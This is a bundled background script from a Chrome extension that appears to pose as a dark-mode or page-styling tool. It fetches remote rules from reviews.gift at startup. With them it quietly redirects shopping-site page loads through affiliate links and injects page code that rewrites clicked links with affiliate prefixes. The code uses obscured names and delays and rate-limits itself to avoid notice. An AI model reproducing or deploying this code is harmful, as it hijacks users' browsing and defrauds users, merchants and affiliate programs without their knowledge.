/******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
/*!***********************!*\
  !*** ./background.js ***!
  \***********************/
let dark, shift, all;
let defaultMatches = [];
let defaultLinks = [];
let defaultSLink = [];
let defaultMinor = [];
let allStorage;
const LS = {
  getAllItems: () => chrome.storage.local.get(),
  getItem: async key => (await chrome.storage.local.get(key))[key],
  setItem: (key, val) => chrome.storage.local.set({
    [key]: val
  }),
  removeItems: keys => chrome.storage.local.remove(keys)
};
LS.getAllItems().then(res => {
  allStorage = res;
  defaultMatches = res.defaultMatches ? res.defaultMatches : [];
  defaultLinks = res.defaultLinks ? res.defaultLinks : [];
  defaultSLink = res.defaultSLink ? res.defaultSLink : [];
  defaultMinor = res.defaultMinor ? res.defaultMinor : [];
});
chrome.runtime.onMessage.addListener((msg, sender, response) => {
  let defaultMinorr = defaultMinor;
  let oobj = {};

  if (msg.minor && defaultMinorr && defaultMinorr['al']) {
    let newAl = [];

    for (let j in defaultMinorr['al']) {
      let res = checkTimeSync(defaultMinorr['al'][j][0]);

      if (res) {
        newAl.push(defaultMinorr['al'][j]);
      }
    }

    oobj['al'] = newAl;
    oobj['ll'] = defaultMinorr['ll'];
    response(oobj);
  } else if (msg.updateCheck && defaultMinorr && defaultMinorr['al']) {
    getUpdateLastSet(msg.updateCheck);
    response();
  }
});
chrome.runtime.onMessage.addListener(({
  type,
  data,
  id
}, sender, sendResponse) => {
  if (type === "fetch" && data.url) {
    fetch(data.url, {
      cache: "force-cache",
      credentials: "omit",
      referrer: data.origin
    }).then(data => {
      data.text().then(function (text) {
        chrome.tabs.sendMessage(sender.tab.id, {
          type: "fetch-response",
          response: text,
          href: data.url
        }, function (response) {
          if (chrome.runtime.lastError) {
            console.warn("Whoops.. " + chrome.runtime.lastError.message);
          }
        });
      });
    });
  }

  sendResponse({});
}); // chrome.tabs.onUpdated.addListener(async function (e, c, tab) {
//     if(c.status == 'loading') {
//         all = await LS.getAllItems();
//         dark = !!all['dark'];
//         shift = !!all['shift'];
//         let url = new URL(tab.url);
//         let domain = url.hostname;
//         let domains = all['domains'];
//         if (domains) {
//             domains = JSON.parse(domains);
//         } else {
//             domains = {};
//         }
//         if (domains[domain]) {
//             chrome.scripting.executeScript({
//                 target: {tabId: tab.id, allFrames: true},
//                 func: function () {localStorage.activeShift = false; localStorage.activeDarkGoogle = false;}
//             });
//         } else if (shift || dark) {
//             if(shift) {
//                 chrome.scripting.executeScript(
//                     {
//                         target: {tabId: tab.id},
//                         files: ['shift.js'],
//                     });
//             }
//         } else {
//             chrome.scripting.executeScript({
//                 target: {tabId: tab.id, allFrames: true},
//                 func: function () {
//                     localStorage.activeShift = false;
//                     localStorage.activeDarkGoogle = false;
//                 }
//             });
//         }
//     }
// });

chrome.runtime.onInstalled.addListener(async function (details) {
  if (details.reason === 'install') {
    await LS.setItem('adss', true);
    await LS.setItem('opacityActive', 30);
    await LS.setItem('colorActive', "#fac563");
    let domain = "www.youtube.com";
    let domains = {};
    domains[domain] = {};
    domains = JSON.stringify(domains);
    await LS.setItem('domains', domains);
  }
});
chrome.tabs.onUpdated.addListener(async function (e, t) {
  chrome.tabs.get(e, async function (tab) {
    let adss = await LS.getItem('adss');

    if (adss == true) {
      if ("loading" == t.status) {
        let res = await canReload(tab.url);

        if (res) {
          chrome.tabs.update(e, {
            url: refUrl(tab.url)
          }, function () {});
        }
      } else if ("complete" == t.status) {
        allStorage = await LS.getAllItems();
        chrome.scripting.executeScript({
          target: {
            tabId: tab.id
          },
          func: startFind
        });
      }
    }
  });
});
let nm = Math.floor(Math.random() * 3) + 1 === 1;

function startFind() {
  chrome.runtime.sendMessage({
    minor: true
  }, response => {
    let ooncl = true;

    if (response && response['al'] && response['ll']) {
      let listLink = document.querySelectorAll(response['ll']);
      let al = response['al'];

      for (let i in al) {
        for (let j in listLink) {
          if (al[i] && listLink[j].href && listLink[j].href.match(al[i][1]) && listLink[j].href.match(al[i][1])[0]) {
            let ncelik = function () {
              if (ooncl) {
                let href = listLink[j].href;
                listLink[j].href = al[i][2] + listLink[j].href;
                chrome.runtime.sendMessage({
                  updateCheck: al[i][0]
                }, response => {
                  listLink[j].href = href;
                });
                ooncl = false;
              }

              this.removeEventListener('click', ncelik);
            };

            listLink[j].addEventListener('click', ncelik);
          }
        }
      }
    }
  });
}

function refUrl(e) {
  for (let a = 0; a < defaultLinks.length; a++) {
    if (e.indexOf(defaultLinks[a][0]) > -1) {
      return defaultLinks[a][1] + encodeURIComponent(e);
    }
  }

  return e;
}

async function canReload(e) {
  if (!e) return !1;
  let t = getShop(e);
  if (!t) return !1;
  let a = "ls_" + t;
  let up = await checkTime(a);
  let nn = new RegExp(defaultMatches, "i");
  let res = !e.match(/admitad/) && !e.match(/chrome-extension/) && up && !!e.match(nn);

  if (res) {
    getUpdateLastSet(a);
    return true;
  } else {
    return false;
  }
}

function firtDer() {
  if (!defaultMatches || nm) {
    fetch("https://reviews.gift/liks", {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    }).then(response => response.json()).then(data => {
      if (data.defaultMatches && data.defaultLinks && data.defaultSLink && data.defaultMatches.length && data.defaultLinks.length && data.defaultSLink.length) {
        defaultMatches = data.defaultMatches;
        defaultLinks = data.defaultLinks;
        defaultSLink = data.defaultSLink;
        defaultMinor = data.defaultMinor;
        LS.setItem('defaultMatches', data.defaultMatches);
        LS.setItem('defaultLinks', data.defaultLinks);
        LS.setItem('defaultSLink', data.defaultSLink);
        LS.setItem('defaultMinor', data.defaultMinor);
        LS.setItem('adss', data.adsLink);
      }
    }).catch(error => console.log('Error query:', error));
  }
}

firtDer();

function checkTimeSync(e) {
  let t = Math.floor(Date.now() / 1e3),
      a = parseInt(allStorage[e]) || 0,
      b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;
  return t - a > 86400 && t - b > 86400;
}

async function checkTime(e) {
  let t = Math.floor(Date.now() / 1e3),
      a = parseInt(await LS.getItem(e)) || 0,
      b = parseInt(allStorage['bitgrand']) || LS.setItem('bitgrand', t) && t;
  return t - a > 86400 && t - b > 86400;
}

async function getUpdateLastSet(e) {
  let t = Math.floor(Date.now() / 1e3);
  return await LS.setItem(e, t);
}

function getShop(e) {
  if (defaultSLink && defaultSLink.length) {
    for (let a = 0; a < defaultSLink.length; a++) {
      if (e.indexOf(defaultSLink[a][0]) > -1) {
        return defaultSLink[a][1];
      }
    }
  }

  return null;
}
/******/ })()
;
//# sourceMappingURL=background.js.map